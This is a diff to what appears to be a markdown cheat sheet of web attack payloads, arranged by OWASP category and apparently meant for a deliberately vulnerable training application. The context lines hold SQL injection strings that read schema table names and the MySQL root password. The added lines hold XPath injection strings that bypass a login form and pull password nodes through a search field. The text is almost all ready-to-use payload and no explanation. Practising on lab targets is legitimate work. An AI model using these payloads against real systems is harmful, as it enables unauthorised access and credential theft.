@@ -139,6 +139,18 @@ asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bW
 asdf',(select password from mysql.user where user='root' ))-- 
 ```
 
+### XML/XPath Injection (Login Form)
+```
+password=' or id='2
+```
+
+### XML/XPath Injection (Search)
+```
+genre=')]/password | a[contains(a,'
+genre=') or contains(genre, '
+genre=') or not(contains(genre, 'xxx') and '1'='2
+```
+
 # A2 - Broken Authentication
 
 ### Broken Auth. - CAPTCHA Bypassing
